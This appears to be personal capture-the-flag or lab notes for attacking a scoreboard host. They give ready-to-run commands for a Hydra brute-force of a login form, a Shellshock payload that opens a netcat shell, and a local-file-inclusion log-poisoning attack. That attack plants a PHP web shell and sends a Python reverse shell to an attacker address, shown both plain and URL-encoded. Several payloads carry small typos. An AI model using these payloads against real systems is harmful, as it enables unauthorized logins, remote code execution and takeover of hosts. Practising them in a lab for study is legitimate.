## Attempt 1 Hydra (Brute Force)

* Open Kali terminal man hydra read options that can be used with this tool.

* Then use this command on the scoreboard

     hydra 192.168.20.100 -V -L /usr/local/share/wordlists/metasploit/usernames.txt -P /usr/local/share/wordlists/metasploit/password.lst http-post-form "/login/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=1bb4kj24fkfnk4kf2ff2wq1evln1; security=low"


## Command explanation

     192.168.20.100 is the host we are analyzing

     -V is verbose mode to log eveything

     -L is the username file location

     -P is the password file location

     http-post-form is the type of request followed by the request params.

     : is used to declare a variable.


## Things that need to be checked

[X] The forward slash after login? is it login.php? or just /login/

[X] Is the cookie security being posted? If so, what is the value?


## Tools for analysis

* PostMan to view data being sent.

* Burp Suite to view data being sent through the browswer. If you decide to use this ensure to set the proxy of the browser to loop back IP 127.0.0.1


## Attempt 2 shellshock reverse shell code

* run dirb https://192.168.20.100 this should return results using common.txt wordlist.

* check to see if any /cgi-bin/ sub-directories

* curl -A '() { :; }; usr/bin/nc -l -p 3333 -e /bin/sh' http://192.168.20.100/home

* then run from another terminal nc 192.168.20.100 3333

* ls should show results from reverse shell

## Attempt 3 LFI Vulnerability

* LFI - Local File Inclusion

* Redirect parameter is the same as view parameter which loads the new page.

* Attempt to traverse the directory for example ../../../var/log/apache2/access.log

* With payload to execute commands:

      <?php system($_GET['cmd']); >>

* Another payload to send reverse shell in python:

      python -c  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

* Request 1:

      $ nc secureapplication.example 80
      GET /<?php system($_GET['cmd']);?>
      
* Request 2:

      /index.php?view=../../../var/log/apache2/access.log&cmd=python+-c+'import+  socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("192.168.20.100",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'
      
* By listening on port 4444 we can see that a shell has been received.



